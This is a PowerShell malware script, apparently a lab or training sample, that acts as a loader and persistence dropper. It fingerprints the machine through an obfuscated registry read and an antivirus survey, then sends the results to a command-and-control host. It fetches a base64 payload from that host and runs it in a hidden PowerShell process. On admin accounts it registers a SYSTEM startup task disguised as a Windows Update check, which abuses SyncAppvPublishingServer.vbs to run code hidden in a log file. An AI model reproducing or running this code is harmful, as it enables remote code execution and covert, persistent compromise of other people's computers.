function msgbox {
    param($Caption, $Text)

    $ps = [PowerShell]::Create()
    $null = $ps.AddScript(@"
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.MessageBox]::Show('$Text', '$Caption')
"@)

    $ps.BeginInvoke()
}

function av_enabled([uint32]$state) {
    [byte[]] $bytes = [System.BitConverter]::GetBytes($state);
    if (($bytes[1] -eq 0x10) -or ($bytes[1] -eq 0x11)) {
        return "Enabled";
    }
    elseif (($bytes[1] -eq 0x00) -or ($bytes[1] -eq 0x01) -or ($bytes[1] -eq 0x20) -or ($bytes[1] -eq 0x21)) {
        return "Disabled";
    }
    return "Unknown";
}

function getav() {

    $avs = Get-WmiObject -Namespace "root\SecurityCenter" -Class "AntiVirusProduct";
    $avs += Get-WmiObject -Namespace "root\SecurityCenter2" -Class "AntiVirusProduct";

    $avsjson = @{}

    foreach ($av in $avs) {
        $enabled = (av_enabled $av.productState);
        $avsjson[$av.displayName.Replace("/", "")] = $enabled
    }

    return $avsjson | ConvertTo-Json
}

function register {
    $macguid = (Get-ItemProperty ((([regex]::Matches('yhpargotpyrC\tfosorciM\ERAWTFOS\:MLKH','.','RightToLeft') | ForEach {$_.value}) -join '')) -Name MachineGuid).MachineGUID; # 8205983a-e00c-4de6-b1e9-162193e7a9ab
    $userid = "$($env:USERDOMAIN)$($env:USERNAME)$($env:PROCESSOR_REVISION)$($env:PROCESSOR_IDENTIFIER)$($env:PROCESSOR_LEVEL)$($env:NUMBER_OF_PROCESSORS)$($macguid)"; # G15lukas4401AMD64 Family 25 Model 68 Stepping 1, AuthenticAMD2516
    
    $avs = getav
    
    $response = Invoke-RestMethod -Method Post -Body $avs -Uri "http://10.10.10.10:55899/$($macguid)?userid=$($userid)" 

    $buf = [Convert]::FromBase64String($response);
    $p = [Diagnostics.Process]::new();
    $p.StartInfo.WindowStyle = 'Hidden';
    $p.StartInfo.FileName = 'powershell.exe';
    $p.StartInfo.UseShellExecute = $false;
    $p.StartInfo.RedirectStandardInput = $true;
    $p.StartInfo.RedirectStandardOutput = $true;
    $p.Start();
    $p.BeginOutputReadLine();
    $p.StandardInput.WriteLine($buf);
    $p.StandardInput.WriteLine('');
}


if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {

    msgbox "Oh, you have been infected", "I am operating as $(whoami)")

    $msg = "## KEYLOGGER`n`tBuffer Send to API"
    $msg | Out-File -FilePath C:\Users\Public\MalwareOutput.txt -Append

    $syncappVBS = '%SystemDrive%\Windows\System32\SyncAppvPublishingServer.vbs'
    $syncappVBS_args = 'n; $a=Get-Content "C:\Windows\logs\system-logs.txt" | Select -Index 17033;$script_decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a)); $script_block = [Scriptblock]::Create($script_decoded);Invoke-Command $script_block' 

    $action = New-ScheduledTaskAction -Execute $syncappVBS -Argument $syncappVBS_args
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    $task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings

    $task_name = "System Updates Critical Check"
    $task_path = "\Microsoft\Windows\WindowsUpdate\"
    $taks_desc = "Updates system critical check to ensure system security"
    $task_usr = "NT AUTHORITY\SYSTEM"

    try{
        Register-ScheduledTask -TaskName $task_name -InputObject $task -TaskPath $task_path -Description $taks_desc -User $task_usr -RunLevel Highest
    } catch {
        $msg = "## KEYLOGGER`n`tBuffer Send to API"
                             $msg | Out-File -FilePath C:\Users\Public\MalwareOutput.txt -Append
        msgbox("Smutny Pribeh", "Cannot create Schedulet task")
    }

} else {
    $msg = "## KEYLOGGER`n`tBuffer Send to API"
    $msg | Out-File -FilePath C:\Users\Public\MalwareOutput.txt -Append
   msgbox("", ":(")
}